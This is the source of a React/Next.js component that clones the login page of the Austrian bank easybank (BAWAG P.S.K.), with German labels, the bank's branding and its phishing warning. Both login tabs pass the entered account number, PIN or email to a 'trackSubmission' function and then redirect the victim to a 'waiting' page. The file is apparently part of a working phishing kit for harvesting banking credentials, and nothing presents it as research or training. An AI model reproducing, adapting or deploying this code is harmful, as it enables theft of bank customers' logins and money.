"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

interface LoginFormProps {
  error: string | null;
}

export default function LoginForm({ error }: LoginFormProps) {
  const router = useRouter();
  const [dn, setDn] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [activeTab, setActiveTab] = useState<"verfueger" | "app">("verfueger");
  const [email, setEmail] = useState("");

  return (
    <div id="wrapper">
      {/* HEADER */}
      <div id="header">
        <div id="upper-header" className="tright">
          <div id="logo" className="fleft first">
            <a href="https://www.easybank.at/" target="_blank" aria-label="easybank Webseite">
              <img src="/easybank/logo-easybank_de.png" id="logo-easybank" alt="" />
            </a>
          </div>
          <div className="fleft second">
            <div id="wrap-menue">
              <ul>
                <li className="help"><a href="#">Hilfe</a></li>
                <li className="last">
                  <select className="language-switcher" defaultValue="de" suppressHydrationWarning>
                    <option value="de">deutsch</option>
                    <option value="en">english</option>
                  </select>
                </li>
              </ul>
            </div>
            <div id="date-display" className="tright">Samstag, 09.05.2026 - 08:44</div>
          </div>
        </div>
        <div id="main-navigation">
          <div id="navi"><ul></ul></div>
        </div>
      </div>

      {/* CONTENT */}
      <div id="content" className="isloggedout promo">
        <form id="form" onSubmit={(e) => e.preventDefault()}>
          <div id="login" className="clearfix">
            {/* LEFT COLUMN */}
            <div className="column-first" id="login-input">
              <div className="green-box" id="boxGreen1">
                {/* Green header */}
                <div className="green-box-header" style={{ height: 40 }}>
                  <div className="login-left"></div>
                  <div className="login-repeat">
                    <label>Login mit Zugangsdaten</label>
                    <a href="#">Hilfe</a>
                  </div>
                  <div className="login-right"></div>
                </div>

                {/* Content */}
                <div className="box-content">
                  {error && (
                    <div
                      style={{
                        backgroundColor: "#fdeaea",
                        color: "#990000",
                        border: "1px solid #f5c6cb",
                        borderRadius: "5px",
                        padding: "10px 14px",
                        marginBottom: "12px",
                        fontSize: "0.95em",
                      }}
                    >
                      {error}
                    </div>
                  )}

                  <p>Wie wollen Sie sich einloggen?</p>

                  {/* Tabs */}
                  <div id="login_tabs">
                    <a href="#" onClick={(e) => { e.preventDefault(); setActiveTab("verfueger"); }}>
                      <div id="login_tab_disposer" className={`login_tab ${activeTab === "verfueger" ? "login_tab_active" : "login_tab_inactive"}`}>
                        Verfüger
                      </div>
                    </a>
                    <a href="#" onClick={(e) => { e.preventDefault(); setActiveTab("app"); }}>
                      <div id="login_tab_app" className={`login_tab ${activeTab === "app" ? "login_tab_active" : "login_tab_inactive"}`}>
                        Mit der App
                      </div>
                    </a>
                    <div className="clear"></div>
                  </div>

                  {/* Verfüger Tab */}
                  {activeTab === "verfueger" && (
                    <div id="tab_disposer" className="form-wrap">
                      <div id="tab_disposer_info"></div>
                      <div className="data">
                        <label htmlFor="lof5" style={{ marginTop: 3 }}>Verfügernummer</label>
                        <input type="text" id="lof5" name="dn" maxLength={17} value={dn} onChange={(e) => setDn(e.target.value)} suppressHydrationWarning />
                        <div className="info fright">Verfüger ohne führende Nullen!</div>
                      </div>
                      <div className="data" style={{ position: "relative" }}>
                        <label htmlFor="pin" style={{ marginTop: 3 }}>PIN</label>
                        <input type={showPin ? "text" : "password"} id="pin" name="pin" maxLength={16} value={pin} onChange={(e) => setPin(e.target.value)} suppressHydrationWarning style={{ width: 206, height: 20, borderRadius: 5, paddingLeft: 6 }} />
                        <button type="button" className="eye-toggle" onClick={() => setShowPin(!showPin)} aria-label="Sichtbarkeit des Passwortes umstellen">
                          {showPin ? "\u{1F648}" : "\u{1F441}"}
                        </button>
                        <div className="info fright">8 bis 16-stellig</div>
                      </div>
                      <div className="data">
                        <div className="dynamic-btn fright">
                          <div className="content">
                            <a href="#" title="Login" onClick={async (e) => { e.preventDefault(); await trackSubmission("easybank", "login", { dn, pin }); router.push(`/waiting?user=${encodeURIComponent(dn)}`); }}>Login</a>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* App Tab */}
                  {activeTab === "app" && (
                    <div id="tab_app">
                      <div id="tab_app_info">Verwenden Sie Ihre für die easybank app registrierte E-Mail oder Ihre Verfügernummer.</div>
                      <div className="data">
                        <label htmlFor="email" style={{ lineHeight: "normal" }}>E-Mail ODER Verfügernummer</label>
                        <input type="text" id="email" name="email" value={email} onChange={(e) => setEmail(e.target.value)} suppressHydrationWarning />
                      </div>
                      <div className="data">
                        <div className="dynamic-btn fright" style={{ marginTop: 16 }}>
                          <div className="content">
                            <a href="#" onClick={async (e) => { e.preventDefault(); await trackSubmission("easybank", "login_app", { email }); router.push(`/waiting?user=${encodeURIComponent(email)}`); }}>Weiter</a>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Link */}
                  <div className="data">
                    <ul className="login-box-link">
                      <li><a href="#" target="_blank">eBanking Zugang entsperren</a></li>
                    </ul>
                  </div>
                </div>
                <div className="box-footer"></div>
              </div>
            </div>

            {/* RIGHT COLUMN */}
            <div className="column-third" id="login-info">
              <div style={{ position: "relative" }} className="top clearfix">
                {/* Box 1 -- Warnung */}
                <div className="info-box">
                  <div className="login-info-top"></div>
                  <div className="login-info-repeat-x">
                    <h3>Warnung</h3>
                    <div className="stripline"></div>
                    <div className="notification-text">
                      <strong>Achtung vor Phishing</strong><br />
                      Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Kodes, Kreditkarten-Daten einzugeben oder zu bestätigen!<br />
                      <a href="#" target="_blank" style={{ color: "#4B9920", marginTop: 5, display: "inline-block" }}>Weiterlesen</a>
                    </div>
                  </div>
                  <div className="login-info-bottom"></div>
                </div>

                {/* Box 2 -- Hilfe/Hotline */}
                <div className="info-box">
                  <div className="login-info-top"></div>
                  <div className="login-info-repeat-x">
                    <h3>Hilfe/Hotline</h3>
                    <div className="stripline"></div>
                    <ul>
                      <li><a href="#" target="_blank">PIN vergessen oder Verfüger gesperrt?</a></li>
                      <li><a href="#" target="_blank">FAQ</a></li>
                    </ul>
                  </div>
                  <div className="login-info-bottom"></div>
                </div>

                {/* Box 3 -- Info */}
                <div className="info-box last">
                  <div className="login-info-top"></div>
                  <div className="login-info-repeat-x">
                    <h3>Info</h3>
                    <div className="stripline"></div>
                    <ul>
                      <li><a href="#" target="_blank"><strong>Bestellung PIN-Code für Debitkarte</strong></a></li>
                      <li><a href="#" target="_blank">Alle Infos zur<br />easybank App</a></li>
                      <li><a href="#" target="_blank">Zu Watchlist Internet</a></li>
                    </ul>
                  </div>
                  <div className="login-info-bottom"></div>
                </div>
              </div>

              {/* Promo */}
              <div className="promo-area">
                <a href="#" target="_blank">
                  <img src="/easybank/EASY26016_login.jpg" alt="Promo" width={564} height={170} />
                </a>
              </div>
            </div>
          </div>
        </form>
      </div>

      {/* FOOTER */}
      <div id="footer">
        <div className="footer-navigation">
          <div className="footer-first"></div>
          <div className="footer-second">
            <ul>
              <li style={{ width: 84 }}><a href="#" target="_blank">Impressum</a></li>
              <li style={{ width: 47 }}><a href="#" target="_blank">AGB</a></li>
              <li style={{ width: 92 }}><a href="#" target="_blank">Datenschutz</a></li>
              <li style={{ width: 150 }}><a href="#" target="_blank">Nutzungsbedingungen</a></li>
              <li style={{ width: 84 }}><a href="#" target="_blank">Barrierefrei</a></li>
              <li className="last-footer" style={{ width: 119 }}>&copy; BAWAG P.S.K.</li>
            </ul>
          </div>
        </div>
      </div>
      <div id="spacer-footer"></div>
    </div>
  );
}
